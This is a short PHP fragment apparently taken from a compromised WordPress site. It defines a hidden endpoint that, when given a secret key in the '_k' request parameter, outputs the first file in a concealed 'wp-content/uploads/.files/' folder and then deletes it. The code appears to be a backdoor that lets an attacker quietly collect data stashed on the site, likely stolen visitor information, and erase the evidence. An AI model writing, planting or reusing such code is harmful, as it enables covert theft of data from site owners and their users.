if ($_REQUEST["_k"] == "INSERT_KEY") {
    $dirpath = ABSPATH . "wp-content/uploads/.files/";
    $files = scandir($dirpath);
    if (count($files) > 2) {
        $filename = $dirpath . $files[2];
        readfile($filename);
        unlink($filename);
    } else {
        http_response_code(202);
    }
    die;
}
